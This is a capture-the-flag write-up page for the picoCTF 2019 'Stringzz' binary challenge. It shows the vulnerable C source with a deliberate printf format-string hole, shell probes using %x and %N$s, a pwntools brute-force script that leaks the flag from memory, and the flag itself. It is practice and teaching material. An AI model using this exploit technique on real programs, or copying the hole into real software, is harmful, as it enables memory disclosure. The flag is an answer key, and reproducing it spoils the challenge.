@@ -1,0 +1,121 @@
+<!doctype html><html lang=en class="sidebar-visible no-js ayu"><meta charset=utf-8><title>PicoCTF19 Stringzz - Capture The Flag</title><meta charset=utf-8><meta name=description content><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#ffffff"><link rel="shortcut icon" href=../../favicon.png><link rel=stylesheet href=../../css/variables.css><link rel=stylesheet href=../../css/general.css><link rel=stylesheet href=../../css/chrome.css><link rel=stylesheet href=../../css/print.css media=print><link rel=stylesheet href=../../FontAwesome/css/font-awesome.css><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel=stylesheet><link rel=stylesheet href=../../highlight.css><link rel=stylesheet href=../../tomorrow-night.css><link rel=stylesheet href=../../ayu-highlight.css><link rel=stylesheet href=../../theme/mermaid.css><script>var path_to_root="../../";var default_theme=window.matchMedia("(prefers-color-scheme: dark)").matches?"ayu":"ayu";</script><script>try{var theme=localStorage.getItem('mdbook-theme');var sidebar=localStorage.getItem('mdbook-sidebar');if(theme.startsWith('"')&&theme.endsWith('"')){localStorage.setItem('mdbook-theme',theme.slice(1,theme.length-1));}
+if(sidebar.startsWith('"')&&sidebar.endsWith('"')){localStorage.setItem('mdbook-sidebar',sidebar.slice(1,sidebar.length-1));}}catch(e){}</script><script>var theme;try{theme=localStorage.getItem('mdbook-theme');}catch(e){}
+if(theme===null||theme===undefined){theme=default_theme;}
+var html=document.querySelector('html');html.classList.remove('no-js')
+html.classList.remove('ayu')
+html.classList.add(theme);html.classList.add('js');</script><script>var html=document.querySelector('html');var sidebar='hidden';if(document.body.clientWidth>=1080){try{sidebar=localStorage.getItem('mdbook-sidebar');}catch(e){}
+sidebar=sidebar||'visible';}
+html.classList.remove('sidebar-visible');html.classList.add("sidebar-"+sidebar);</script><nav id=sidebar class=sidebar aria-label="Table of contents"><div id=sidebar-scrollbox class=sidebar-scrollbox><ol class=chapter><li class=expanded><a href=../../index.html><strong aria-hidden=true>1.</strong> Introduction</a><li class=expanded><a href=../../MISCELLANEOUS.html><strong aria-hidden=true>2.</strong> Miscellaneous</a><li class=expanded><a href=../../ctf/index.html><strong aria-hidden=true>3.</strong> Capture The Flag</a><li><ol class=section><li class=expanded><a href=../../ctf/binary/index.html><strong aria-hidden=true>3.1.</strong> Binary Exploitation</a><li><ol class=section><li class=expanded><a href=../../ctf/binary/picoctf19-handy_shellcode.html><strong aria-hidden=true>3.1.1.</strong> PicoCTF19 Handy Shellcode</a><li class=expanded><a href=../../ctf/binary/picoctf19-overflow_0.html><strong aria-hidden=true>3.1.2.</strong> PicoCTF19 OverFlow 0</a><li class=expanded><a href=../../ctf/binary/picoctf19-overflow_1.html><strong aria-hidden=true>3.1.3.</strong> PicoCTF19 OverFlow 1</a><li class=expanded><a href=../../ctf/binary/picoctf19-overflow_2.html><strong aria-hidden=true>3.1.4.</strong> PicoCTF19 OverFlow 2</a><li class=expanded><a href=../../ctf/binary/picoctf19-new_overflow_1.html><strong aria-hidden=true>3.1.5.</strong> PicoCTF19 NewOverFlow 1</a><li class=expanded><a href=../../ctf/binary/picoctf19-new_overflow_2.html><strong aria-hidden=true>3.1.6.</strong> PicoCTF19 NewOverFlow 2</a><li class=expanded><a href=../../ctf/binary/picoctf19-slippery_shellcode.html><strong aria-hidden=true>3.1.7.</strong> PicoCTF19 Slippery-Shellcode</a><li class=expanded><a href=../../ctf/binary/picoctf19-stringzz.html class=active><strong aria-hidden=true>3.1.8.</strong> PicoCTF19 Stringzz</a></ol><li class=expanded><a href=../../ctf/crypto/index.html><strong aria-hidden=true>3.2.</strong> Crypto</a><li><ol class=section><li class=expanded><a href=../../ctf/crypto/hackcon18-caesar.html><strong aria-hidden=true>3.2.1.</strong> Hackcon2018 Caesar Salad</a><li class=expanded><a href=../../ctf/crypto/hackcon18-salad.html><strong aria-hidden=true>3.2.2.</strong> Hackcon2018 Salad Up.</a><li class=expanded><a href=../../ctf/crypto/icectf18q-garfield.html><strong aria-hidden=true>3.2.3.</strong> IceCTF18Q Garfield</a><li class=expanded><a href=../../ctf/crypto/tjctf18-classic.html><strong aria-hidden=true>3.2.4.</strong> TJCTF18 Classic</a><li class=expanded><a href=../../ctf/crypto/picoctf19-numbers.html><strong aria-hidden=true>3.2.5.</strong> PicoCTF19 The Numbers</a><li class=expanded><a href=../../ctf/crypto/picoctf19-caesar.html><strong aria-hidden=true>3.2.6.</strong> PicoCTF19 Caesar</a><li class=expanded><a href=../../ctf/crypto/picoctf19-wavesoverlambda.html><strong aria-hidden=true>3.2.7.</strong> PicoCTF19 Waves Lambda</a><li class=expanded><a href=../../ctf/crypto/picoctf19-lacifrede.html><strong aria-hidden=true>3.2.8.</strong> PicoCTF19 La Cifra De</a><li class=expanded><a href=../../ctf/crypto/picoctf19-rsapopquiz.html><strong aria-hidden=true>3.2.9.</strong> PicoCTF19 RSA Pop Quiz</a><li class=expanded><a href=../../ctf/crypto/picoctf19-minirsa.html><strong aria-hidden=true>3.2.10.</strong> PicoCTF19 miniRSA</a><li class=expanded><a href=../../ctf/crypto/picoctf19-b00tl3gRSA2.html><strong aria-hidden=true>3.2.11.</strong> PicoCTF19 b00tl3gRSA2</a><li class=expanded><a href=../../ctf/crypto/picoctf19-b00tl3gRSA3.html><strong aria-hidden=true>3.2.12.</strong> PicoCTF19 b00tl3gRSA3</a><li class=expanded><a href=../../ctf/crypto/picoctf19-john_pollard.html><strong aria-hidden=true>3.2.13.</strong> PicoCTF19 john_pollard</a><li class=expanded><a href=../../ctf/crypto/picoctf19-aesabc.html><strong aria-hidden=true>3.2.14.</strong> PicoCTF19 AES-ABC</a></ol><li class=expanded><a href=../../ctf/forensics/index.html><strong aria-hidden=true>3.3.</strong> Forensics</a><li><ol class=section><li class=expanded><a href=../../ctf/forensics/picoctf19-garden.html><strong aria-hidden=true>3.3.1.</strong> PicoCTF19 Garden</a><li class=expanded><a href=../../ctf/forensics/picoctf19-unzip.html><strong aria-hidden=true>3.3.2.</strong> PicoCTF19 Unzip</a><li class=expanded><a href=../../ctf/forensics/picoctf19-so-meta.html><strong aria-hidden=true>3.3.3.</strong> PicoCTF19 So Meta</a><li class=expanded><a href=../../ctf/forensics/picoctf19-what-lies-within.html><strong aria-hidden=true>3.3.4.</strong> PicoCTF19 Lies Within</a><li class=expanded><a href=../../ctf/forensics/picoctf19-extensions.html><strong aria-hidden=true>3.3.5.</strong> PicoCTF19 Extensions</a><li class=expanded><a href=../../ctf/forensics/picoctf19-shark-on-wire-1.html><strong aria-hidden=true>3.3.6.</strong> PicoCTF19 Shark Wire</a><li class=expanded><a href=../../ctf/forensics/picoctf19-whitepages.html><strong aria-hidden=true>3.3.7.</strong> PicoCTF19 WhitePages</a><li class=expanded><a href=../../ctf/forensics/picoctf19-like1000.html><strong aria-hidden=true>3.3.8.</strong> PicoCTF19 like1000</a></ol><li class=expanded><a href=../../ctf/web/index.html><strong aria-hidden=true>3.4.</strong> Web</a><li><ol class=section><li class=expanded><a href=../../ctf/web/seccon19-web_search.html><strong aria-hidden=true>3.4.1.</strong> SECCON19 Web Search</a><li class=expanded><a href=../../ctf/web/tmctf19-finals-containers.html><strong aria-hidden=true>3.4.2.</strong> TMCTF19F Container</a></ol></ol></ol></div><div id=sidebar-resize-handle class=sidebar-resize-handle></div></nav><div id=page-wrapper class=page-wrapper><div class=page><div id=menu-bar class=menu-bar><div id=menu-bar-sticky-container><div class=left-buttons><button id=sidebar-toggle class=icon-button type=button title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls=sidebar>
+<i class="fa fa-bars"></i></button>
+<button id=theme-toggle class=icon-button type=button title="Change theme" aria-label="Change theme" aria-haspopup=true aria-expanded=false aria-controls=theme-list>
+<i class="fa fa-paint-brush"></i></button><ul id=theme-list class=theme-popup aria-label=Themes role=menu><li role=none><button role=menuitem class=theme id=light>Light</button><li role=none><button role=menuitem class=theme id=rust>Rust</button><li role=none><button role=menuitem class=theme id=coal>Coal</button><li role=none><button role=menuitem class=theme id=navy>Navy</button><li role=none><button role=menuitem class=theme id=ayu>Ayu (default)</button></ul><button id=search-toggle class=icon-button type=button title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded=false aria-keyshortcuts=S aria-controls=searchbar>
+<i class="fa fa-search"></i></button></div><h1 class=menu-title>Capture The Flag</h1><div class=right-buttons><a href=../../print.html title="Print this book" aria-label="Print this book"><i id=print-button class="fa fa-print"></i></a><a href=https://github.com/sgama/ctf.samsongama.com title="Git repository" aria-label="Git repository"><i id=git-repository-button class="fa fa-github"></i></a></div></div></div><div id=search-wrapper class=hidden><form id=searchbar-outer class=searchbar-outer><input type=search name=search id=searchbar name=searchbar placeholder="Search this book ..." aria-controls=searchresults-outer aria-describedby=searchresults-header></form><div id=searchresults-outer class="searchresults-outer hidden"><div id=searchresults-header class=searchresults-header></div><ul id=searchresults></ul></div></div><script>document.getElementById('sidebar-toggle').setAttribute('aria-expanded',sidebar==='visible');document.getElementById('sidebar').setAttribute('aria-hidden',sidebar!=='visible');Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link){link.setAttribute('tabIndex',sidebar==='visible'?0:-1);});</script><div id=content class=content><main><h1><a class=header href=#picoctf19-stringzz id=picoctf19-stringzz>PicoCTF19 Stringzz</a></h1><h2><a class=header href=#challenge id=challenge>Challenge</a></h2><p>Use a format string to pwn this <a href=https://2019shell1.picoctf.com/static/f636d94e58ef1e11c1951b986a3c3754/vuln>program</a> and get a flag. Its also found in /problems/stringzz_2 on the shell server. <a href=https://2019shell1.picoctf.com/static/f636d94e58ef1e11c1951b986a3c3754/vuln.c>Source</a>.<h2><a class=header href=#hints id=hints>Hints</a></h2><p><a href=http://www.cis.syr.edu/%7Ewedu/Teaching/cis643/LectureNotes_New/Format_String.pdf>http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf</a><h2><a class=header href=#solution id=solution>Solution</a></h2><p>Let's view the directory<pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$ ls -al
+total 92
+drwxr-xr-x   2 root       root        4096 Sep 28 21:45 .
+drwxr-x--x 684 root       root       69632 Oct 10 18:02 ..
+-r--r-----   1 hacksports stringzz_2    31 Sep 28 21:45 flag.txt
+-rwxr-sr-x   1 hacksports stringzz_2  7660 Sep 28 21:45 vuln
+-rw-rw-r--   1 hacksports hacksports   789 Sep 28 21:45 vuln.c
+samson@pico-2019-shell1:/problems/stringzz_2$ cat vuln.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#define FLAG_BUFFER 128
+#define LINE_BUFFER_SIZE 2000
+
+void printMessage3(char *in) {
+  puts(&quot;will be printed:\n&quot;);
+  printf(in);
+}
+void printMessage2(char *in) {
+  puts(&quot;your input &quot;);
+  printMessage3(in);
+}
+void printMessage1(char *in) {
+  puts(&quot;Now &quot;);
+  printMessage2(in);
+}
+
+int main (int argc, char **argv) {
+    puts(&quot;input whatever string you want; then it will be printed back:\n&quot;);
+    int read;
+    unsigned int len;
+    char *input = NULL;
+    getline(&amp;input, &amp;len, stdin);
+    //There is no win function, but the flag is wandering in the memory!
+    char * buf = malloc(sizeof(char)*FLAG_BUFFER);
+    FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+    fgets(buf,FLAG_BUFFER,f);
+    printMessage1(input);
+    fflush(stdout);
+}
+</code></pre><p>After reading the paper recommended from the hints, it looks like we'll be expoiting the <code>printf()</code> vulnerability.
+Let's determine if this program is vulnerable to the <code>printf()</code> vulnerability.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$ ./vuln
+input whatever string you want; then it will be printed back:
+
+%x %x %x %x %x
+Now 
+your input 
+will be printed:
+
+a f7d8a36b 565da6f9 f7ef8000 565dbfb4
+</code></pre><p>It is vulnerable. Let's try printing 100 items off the stack and grep for the flag.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$  echo $(python -c &quot;print('%x '*100)&quot;) | ./vuln
+input whatever string you want; then it will be printed back:
+
+Now 
+your input 
+will be printed:
+
+a f7e1836b 565bf6f9 f7f86000 565c0fb4 ffe72f38 565bf755 56889600 565bf995 f7e1836b 565bf731 f7f86000 565c0fb4 ffe72f58 565bf78e 56889600 565bf993 f7e1681b 565bf76a f7f86000 565c0fb4 ffe72fa8 565bf84d 56889600 80 568897d0 565bf7ae f7f86000 f7f86000 0 ffe73054 f7f863fc 565c0fb4 ffe7305c 12e 56889600 56889740 568897d0 b6b68c00 ffe72fc0 0 0 f7dc9e81 f7f86000 f7f86000 0 f7dc9e81 1 ffe73054 ffe7305c ffe72fe4 1 ffe73054 f7f86000 f7fad75a ffe73050 0 f7f86000 0 0 53fd859e 249e838e 0 0 0 40 f7fc5024 0 0 f7fad869 565c0fb4 1 565bf5b0 0 565bf5e1 565bf797 1 ffe73054 565bf890 565bf8f0 f7fad9b0 ffe7304c f7fc5940 1 ffe747ca 0 ffe747d1 ffe74dbd ffe74df0 ffe74e12 ffe74e1f ffe74e33 ffe74e3f ffe74e79 ffe74e8b ffe74ead ffe74eee ffe74f01 ffe74f17 ffe74f2b 
+</code></pre><p>Okay, whatever it is, we'll need to print it as a string. We can't simply use <code>%s</code> though. See below:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$ echo $(python -c &quot;print('%s')&quot;) | ./vuln
+input whatever string you want; then it will be printed back:
+
+Now 
+your input 
+will be printed:
+
+Segmentation fault (core dumped)
+</code></pre><p>This works because <code>%x</code> prints values off the stack<p>The exploit we want to take advantage of is the <code>Format String Direct Access</code> explained in this <a href=https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf>paper</a>.<p><code>%4$x</code> - prints the 4th parameter on the stack in hex, so <code>%4$s</code> should print it in ASCII.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$ ./vuln
+input whatever string you want; then it will be printed back:
+
+%4$x   
+Now 
+your input 
+will be printed:
+
+f7fa8000
+samson@pico-2019-shell1:/problems/stringzz_2$ ./vuln
+input whatever string you want; then it will be printed back:
+
+%4$s
+Now 
+your input 
+will be printed:
+
+lM
+</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$ python -c &quot;print('%5$s')&quot; | ./vuln
+
+input whatever string you want; then it will be printed back:
+
+Now 
+your input 
+will be printed:
+
+%5
+</code></pre><p>Doesn't seem to work, so let's brute force it:<pre><code class=language-python>#!/usr/bin/env python
+from __future__ import print_function
+from pwn import *
+
+index = 1
+while True:
+    print(&quot;Attempting index: {}&quot;.format(index))
+    p = process('./vuln', cwd='/problems/stringzz_2')
+    p.recvuntil('input whatever string you want; then it will be printed back:')
+    p.sendline(&quot;%{}$s&quot;.format(index))
+    res = p.recvall()
+    if &quot;picoCTF&quot; in res:
+        print(&quot;Found flag: {}&quot;.format(res))
+        break
+    index=index+1
+</code></pre><p>Amazingly, it returns with an answer.<h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>picoCTF{str1nG_CH3353_166b95b4}</code></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-slippery_shellcode.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/crypto/index.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a href=../../ctf/binary/picoctf19-slippery_shellcode.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a href=../../ctf/crypto/index.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
